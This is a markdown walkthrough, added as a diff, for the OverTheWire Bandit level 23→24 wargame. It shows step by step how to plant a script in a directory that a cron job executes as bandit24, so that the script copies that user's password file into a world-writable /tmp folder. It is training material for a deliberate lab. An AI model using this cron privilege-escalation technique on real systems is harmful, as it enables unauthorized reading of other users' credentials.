@@ -1,0 +1,117 @@
+# Bandit Level 23 → Level 24
+
+## Objective
+Retrieve the password for `bandit24` by exploiting a cron job that executes scripts with elevated privileges.
+
+## Challenge Description
+A cron job is running as user `bandit24` that automatically executes and deletes all scripts in the `/var/spool/bandit24/foo/` directory. Your goal is to create a script that will be executed by this cron job to retrieve the password.
+
+## Prerequisites
+- SSH access to bandit23
+- Basic understanding of:
+  - Bash scripting
+  - Cron jobs
+  - Linux file permissions
+  - Privilege escalation concepts
+
+## Solution
+
+### Step 1: Investigate the Cron Job
+```bash
+cd /etc/cron.d/
+cat cronjob_bandit24
+```
+
+Observe that the cron job runs as `bandit24` and executes scripts from `/var/spool/bandit24/foo/`.
+
+### Step 2: Set Up Your Workspace
+```bash
+mkdir -p /tmp/mybandit23_solution
+cd /tmp/mybandit23_solution
+mkdir -p output
+chmod 777 output
+```
+
+### Step 3: Create the Exploit Script
+```bash
+cat > exploit.sh << 'EOF'
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/mybandit23_solution/output/password.txt
+chmod 666 /tmp/mybandit23_solution/output/password.txt
+EOF
+```
+
+### Step 4: Set Permissions and Deploy
+```bash
+chmod +x exploit.sh
+chmod 777 exploit.sh
+cp exploit.sh /var/spool/bandit24/foo/
+```
+
+### Step 5: Wait and Retrieve
+```bash
+# Wait approximately 60 seconds for the cron job to execute
+sleep 60
+cat /tmp/mybandit23_solution/output/password.txt
+```
+
+## Key Concepts
+
+### Cron Jobs
+- Scheduled tasks that run at specified intervals
+- Can run with different user privileges
+- Configuration files located in `/etc/cron.d/`
+
+### Privilege Escalation
+- Running code with another user's permissions
+- In this case, your script executes as `bandit24`
+- Allows access to files you normally couldn't read
+
+### File Permissions
+- **777**: Read, write, execute for all users
+- **666**: Read and write for all users
+- Critical for ensuring the cron job can write to your directories
+
+## Common Pitfalls
+
+1. **Permission Denied**: Ensure all directories and output files have proper permissions (777/666)
+2. **File Not Found**: Wait long enough for the cron job to execute (typically 1 minute)
+3. **Empty Output**: Verify your script syntax and paths are correct
+4. **Directory Conflicts**: Use a unique directory name to avoid collisions with other users
+
+## Security Lessons
+
+This level demonstrates:
+- How misconfigured cron jobs can be exploited
+- The importance of validating script sources
+- Why automated execution of user-supplied code is dangerous
+- The principle of least privilege in system administration
+
+## Cleanup (Optional)
+```bash
+rm -rf /tmp/mybandit23_solution
+```
+
+## Next Steps
+Once you have the password, proceed to Level 24:
+```bash
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+```
+
+## Resources
+- [Cron Job Format](https://crontab.guru/)
+- [Linux File Permissions](https://chmod-calculator.com/)
+- [Bash Scripting Guide](https://www.gnu.org/software/bash/manual/)
+
+## Notes
+- The cron job typically runs every minute
+- Scripts are automatically deleted after execution
+- Multiple users may be attempting this level simultaneously
+- Use unique directory names to avoid interference
+
+---
+
+**Level**: 23 → 24  
+**Difficulty**: Medium  
+**Skills**: Scripting, Cron, Privilege Escalation  
+**Platform**: OverTheWire Bandit
